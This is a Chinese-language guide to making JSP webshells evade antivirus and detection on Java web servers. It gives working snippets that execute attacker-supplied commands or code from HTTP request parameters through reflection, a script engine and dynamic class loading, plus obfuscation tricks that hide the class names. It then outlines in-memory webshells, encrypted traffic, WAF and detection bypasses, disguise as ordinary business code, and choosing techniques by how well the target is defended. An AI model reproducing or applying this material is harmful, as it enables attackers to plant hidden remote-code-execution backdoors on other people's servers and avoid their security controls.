# JSP Webshell 免杀

JSP Webshell的免杀技术，针对Java Web应用。

## 危险类和方法

### 需要避免或混淆
- Runtime.getRuntime().exec()
- ProcessBuilder
- ScriptEngineManager
- ClassLoader.loadClass()
- Method.invoke()

## 替代方案

### 反射调用
```jsp
<%
// 使用反射避免直接调用
Class<?> rt = Class.forName("java.lang.Runtime");
Method getRuntime = rt.getMethod("getRuntime");
Object runtime = getRuntime.invoke(null);
Method exec = rt.getMethod("exec", String.class);
Process process = (Process) exec.invoke(runtime, request.getParameter("cmd"));
%>
```

### 表达式引擎
```jsp
<%
// 使用ScriptEngine
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("JavaScript");
engine.eval(request.getParameter("code"));
%>
```

### ClassLoader动态加载
```jsp
<%
// 动态加载类
byte[] classBytes = Base64.getDecoder().decode(request.getParameter("class"));
ClassLoader cl = new ClassLoader() {
    public Class<?> defineClass(byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
};
Class<?> clazz = cl.defineClass(classBytes);
%>
```

## 混淆技术

### 字符串拆分
```jsp
<%
String cmd = "Ru" + "nti" + "me";
String method = "ge" + "tRu" + "nti" + "me";
Class<?> c = Class.forName("java.lang." + cmd);
%>
```

### Base64编码
```jsp
<%
String encoded = "amF2YS5sYW5nLlJ1bnRpbWU="; // java.lang.Runtime
String className = new String(Base64.getDecoder().decode(encoded));
Class<?> c = Class.forName(className);
%>
```

### 字符数组
```jsp
<%
char[] chars = {'R','u','n','t','i','m','e'};
String className = "java.lang." + new String(chars);
%>
```

## 内存马

### Filter型内存马
```jsp
<%
// 动态注册Filter
// 拦截所有请求
// 执行恶意代码
// 无文件落地
%>
```

### Servlet型内存马
```jsp
<%
// 动态注册Servlet
// 创建新的访问路径
// 持久化访问
%>
```

### Listener型内存马
```jsp
<%
// 注册ServletRequestListener
// 监听所有请求
// 隐蔽性强
%>
```

### Valve型内存马（Tomcat）
```jsp
<%
// 注册Valve
// Tomcat特有
// 优先级高
%>
```

## 流量加密

### AES加密
```jsp
<%
// 请求参数AES加密
// 响应内容AES加密
// 密钥协商
%>
```

### 自定义协议
```jsp
<%
// 自定义请求格式
// 自定义响应格式
// 混淆流量特征
%>
```

## 检测绕过

### 静态检测
```jsp
<%
// 避免关键字出现
// 使用反射和动态加载
// 代码混淆
%>
```

### 动态检测
```jsp
<%
// 延迟执行
// 条件触发
// 环境检测
%>
```

### WAF绕过
```jsp
<%
// 请求方法变换
// 参数编码
// 分块传输
%>
```

## 业务伪装

### 日志处理类
```jsp
<%
// 伪装成日志处理功能
// 正常业务逻辑混合
// 降低怀疑
%>
```

### 文件管理类
```jsp
<%
// 伪装成文件管理功能
// 提供正常的文件操作
// 隐藏恶意功能
%>
```

## 生成策略

根据目标环境选择：
- 低防护：基础反射调用
- 中防护：字符串加密 + 反射
- 高防护：内存马 + 流量加密

---

JSP Webshell免杀需要深入理解Java反射机制和Web容器的工作原理。
